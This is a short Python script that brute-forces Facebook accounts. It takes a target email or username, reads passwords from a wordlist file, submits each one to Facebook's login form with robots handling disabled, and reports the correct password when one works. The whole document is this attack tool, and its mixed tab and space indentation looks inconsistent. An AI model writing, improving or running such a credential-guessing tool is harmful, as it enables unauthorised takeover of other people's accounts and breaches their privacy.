import mechanize
import signal

def facebook_brute():
	
	br=mechanize.Browser()
	print("[*]Browser Initialized[*]")
        br.set_handle_equiv(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
	br.open('https://www.facebook.com/')
	email_username=raw_input("Enter the email address or username:")
	passfile=open("./password_lists/passwords.txt","r")
	
	for password in passfile.readlines():
		
		password=password.rstrip('\n')
	
		try:

			br.select_form(nr=0)
			br.form['email']=email_username
			br.form['pass']=password
			resp=br.submit()

			if 'attempt' in resp.geturl():
				print('\x1b[0;30;41m'"[!]Incorrect Password (%s)" %(password)+'\x1b[0m')
	        		br=mechanize.Browser()
				br.set_handle_equiv(True)
			        br.set_handle_redirect(True)
        			br.set_handle_referer(True)
        			br.set_handle_robots(False)
				br.open('https://www.facebook.com/')

			else:
                                print('\x1b[0;30;42m'+"[+]Correct Password (%s)" %(password)+'\x1b[0m')
				break

		except KeyboardInterrupt:
			print("\nQuitting..")
			return
